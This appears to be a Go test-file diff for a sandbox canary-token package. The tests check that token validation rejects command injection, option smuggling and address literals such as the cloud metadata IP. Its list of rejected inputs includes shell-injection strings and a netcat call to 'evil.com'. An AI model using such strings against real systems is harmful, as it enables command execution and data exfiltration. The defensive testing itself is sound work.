@@ -1,6 +1,7 @@
 package canary
 
 import (
+	"os"
 	"path/filepath"
 	"strings"
 	"testing"
@@ -180,5 +181,129 @@ func TestAddExternal(t *testing.T) {
 	}
 	if !valueKept {
 		t.Fatal("value token lost in the JSON round trip")
+	}
+}
+
+// The runner expands the token list unquoted, so a token that splits into
+// words, reads as an option, or expands as a glob is not data on its way to
+// canary new but a command line written by whoever supplied the token: the
+// project file is not trusted, and card=4111 1111 1111 1111 was enough to make
+// the previous release pass four arguments instead of one.
+func TestValidToken(t *testing.T) {
+	ok := []string{
+		"abc123.canarytokens.com",
+		"ABC123.CanaryTokens.com.",
+		"card=4111-1111-1111-1111",
+		"aws=AKIAIOSFODNN7EXAMPLE",
+		"key=abc/def+ghi~jkl=mno:pqr",
+		"slack=xoxb-12-34-AbCdEf",
+	}
+	for _, tok := range ok {
+		if err := ValidToken(tok); err != nil {
+			t.Errorf("ValidToken(%q): %v", tok, err)
+		}
+	}
+	bad := []string{
+		"",
+		"   ",
+		" abc.com",
+		"abc.com ",
+		"abc def.com",         // word splitting
+		"card=4111 1111 1111", // the shipped bug
+		"card=",               // no value to watch
+		"=4111111111111111",   // no name
+		"$(id).canarytokens.com",
+		"abc.com;touch /tmp/x",
+		"abc.com|nc evil.com 4444",
+		"abc.com`id`",
+		"*abc.com",
+		"-abc.canarytokens.com", // would read as an option to canary new
+		"--allow=evil.com",
+		"abc.com\n",
+		"localhost", // no dot: cannot reach a token service's nameserver
+		"169.254.169.254",
+		"1.2.3.4",
+	}
+	for _, tok := range bad {
+		if err := ValidToken(tok); err == nil {
+			t.Errorf("ValidToken(%q) accepted", tok)
+		}
+	}
+}
+
+// A token host outside the allow-list is forwarded by the proxy, so an address
+// arriving from a project file would have this unconfined process fetch the
+// host's own metadata endpoint on the sandbox's behalf.
+func TestAddExternalRejectsAddressLiterals(t *testing.T) {
+	bad := []string{
+		"169.254.169.254",
+		"127.0.0.1",
+		"10.0.0.1",
+		"[::1]",
+		"localhost",
+		"abc..com",
+		"abc-.com",
+		".abc.com",
+		"abc.123", // last label all digits: a name cannot end this way
+	}
+	for _, tok := range bad {
+		s, err := New("", "", "/private/canary")
+		if err != nil {
+			t.Fatal(err)
+		}
+		if err := s.AddExternal([]string{tok}); err == nil {
+			t.Errorf("AddExternal(%q) accepted", tok)
+		}
+	}
+	s, err := New("", "", "/private/canary")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := s.AddExternal([]string{"ABC123.TokenExample.COM."}); err != nil {
+		t.Fatal(err)
+	}
+	c := s.Credential("external canarytoken")
+	if c == nil || c.Host != "abc123.tokenexample.com" {
+		t.Fatalf("token host not normalised: %+v", c)
+	}
+}
+
+// Reader and writer must apply the same rule, or a set file crafted by a
+// sandboxed process could plant a host that AddExternal would have refused.
+func TestReadRejectsExternalHostAddExternalRefuses(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "set.json")
+	write := func(body string) error {
+		if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
+			return err
+		}
+		_, err := Read(path)
+		return err
+	}
+	const runID = "0123456789abcdef01234567"
+	for _, host := range []string{"169.254.169.254", "127.0.0.1", "localhost", "abc.123"} {
+		body := `{"run_id":"` + runID + `","credentials":[{"label":"external canarytoken","host":"` + host +
+			`","value":"` + host + `","external":true}]}`
+		if err := write(body); err == nil {
+			t.Errorf("Read accepted an external token host of %q", host)
+		}
+	}
+	body := `{"run_id":"` + runID + `","credentials":[{"label":"external canarytoken","host":"abc.tokenexample.com","value":"abc.tokenexample.com","external":true}]}`
+	if err := write(body); err != nil {
+		t.Errorf("Read rejected a sound external token: %v", err)
+	}
+}
+
+// A credential with no host and no value would otherwise become an empty
+// needle, which every request contains: the set would deny all egress rather
+// than watch for one credential.
+func TestNewMatcherIgnoresEmptyValue(t *testing.T) {
+	s := &Set{RunID: "x", Credentials: []Credential{{Label: "blank", Host: "", Value: "", External: true}}}
+	m := NewMatcher(s)
+	if _, ok := m.Bytes([]byte("GET / HTTP/1.1")); ok {
+		t.Fatal("an empty token matched a request that contained nothing")
+	}
+	if _, ok := m.Bytes(nil); ok {
+		t.Fatal("an empty token matched nothing at all")
 	}
 }
